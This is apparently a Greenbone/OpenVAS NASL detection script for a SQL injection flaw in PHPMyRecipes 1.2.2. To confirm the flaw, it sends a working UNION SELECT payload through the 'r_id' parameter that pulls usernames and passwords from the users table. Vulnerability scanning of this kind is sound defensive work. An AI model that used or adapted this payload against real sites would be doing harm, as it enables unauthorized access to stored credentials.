if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.903204" );
	script_version( "2021-08-05T12:20:54+0000" );
	script_bugtraq_id( 58094 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-08-05 12:20:54 +0000 (Thu, 05 Aug 2021)" );
	script_tag( name: "creation_date", value: "2013-02-22 18:45:39 +0530 (Fri, 22 Feb 2013)" );
	script_name( "PHPMyRecipes SQL Injection Vulnerability" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/82243" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/24537" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/120425/phpMyRecipes-1.2.2-SQL-Injection.html" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation allows the attacker to compromise the
  application, access or modify data in the back-end database." );
	script_tag( name: "affected", value: "PHPMyRecipes version 1.2.2 and prior" );
	script_tag( name: "insight", value: "Input passed via 'r_id' parameter in viewrecipe.php is not
  properly sanitised before being returned to the user." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is installed with PHPMyRecipes and is prone to SQL
  Injection Vulnerability." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
vt_strings = get_vt_strings();
for dir in nasl_make_list_unique( "/", "/phpMyRecipes", "/recipes", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: NASLString( dir, "/index.php" ), port: port );
	if(ContainsString( res, ">phpMyRecipes" )){
		url = NASLString( dir, "/recipes/viewrecipe.php?r_id=NULL/**/UNION/**/ALL/**", "/SELECT/**/CONCAT(username,0x3a,password,0x", vt_strings["default_hex"], ")GORONTALO,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL/**/FROM/**/users" );
		if(http_vuln_check( port: port, url: url, pattern: vt_strings["default"], check_header: TRUE, extra_check: "findrecipe.php" )){
			security_message( port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

